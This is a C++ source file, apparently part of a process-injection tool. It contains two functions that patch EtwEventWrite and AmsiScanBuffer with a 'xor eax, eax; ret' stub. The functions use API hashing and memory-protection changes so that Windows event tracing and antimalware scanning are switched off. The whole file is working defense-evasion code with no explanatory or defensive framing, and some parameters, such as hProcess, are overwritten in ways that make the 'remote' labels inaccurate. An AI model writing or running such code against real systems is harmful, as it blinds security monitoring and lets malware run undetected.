#include "patch.hpp"

bool patchRemoteETW(HANDLE hProcess) {
    // 1. Get address of EtwEventWrite from local ntdll (it will be the same in remote)
    // You can use your syscallHandler or GetProcAddress since ntdll is already loaded
    unsigned char* k = helperHandler.getNtdll();
    hProcess = GetCurrentProcess();
    wchar_t wK[50];
    size_t convertedChars = 0;

    mbstowcs_s(&convertedChars, wK, 50, (char*)k, _TRUNCATE);
    PVOID etwAddress = syscallHandler.getFunctionAddressByHash(wK, 615043106);

    if (!etwAddress) return 1;

    unsigned char patch[] = { 0x31, 0xC0, 0xC3 }; // xor eax, eax; ret
    SIZE_T patchSize = sizeof(patch);

    std::cout << "[!] Patching ETW at: " << etwAddress << std::endl;

    // 2. Change protection to RW
    mainInjector.protectMemFlag(hProcess, etwAddress, PAGE_READWRITE, patchSize);

    // 3. Write the patch
    mainInjector.wrMem(hProcess, etwAddress, (LPVOID)patch, patchSize);

    // 4. Restore protection to RX
    mainInjector.protectMemFlag(hProcess, etwAddress, PAGE_EXECUTE_READ, patchSize);

    std::cout << "[+] ETW silenced in remote process." << std::endl;
    return 0;
}


bool patchRemoteAmsi(HANDLE hProcess) {
    HMODULE amsiBaseAddr = (HMODULE)mainInjector.findRemoteModule(hProcess, L"amsi.dll");
    if (!amsiBaseAddr) {
        std::cout << "[-] Failed to find amsi.dll in remote process going to load it" << std::endl;
        amsiBaseAddr = LoadLibraryW(L"amsi.dll");
	}
    hProcess = GetCurrentProcess();
    PVOID amsiScanBuffAdr = syscallHandler.getFunctionAddressByHash(L"amsi.dll", 704434574);
    unsigned char patch[] = { 0x31, 0xC0, 0xC3 }; // xor eax, eax; ret
    SIZE_T patchSize = sizeof(patch);

    std::cout << "[!] Patching AmsiScanBuffer at: " << amsiScanBuffAdr << std::endl;

    // Change protection to RW
    mainInjector.protectMemFlag(hProcess, amsiScanBuffAdr, PAGE_READWRITE, patchSize);

    //Write the patch
    mainInjector.wrMem(hProcess, amsiScanBuffAdr, (LPVOID)patch, patchSize);

    //Restore protection to RX
    mainInjector.protectMemFlag(hProcess, amsiScanBuffAdr, PAGE_EXECUTE_READ, patchSize);

    std::cout << "[+] Amsi silenced in remote process." << std::endl;
    return 0;
}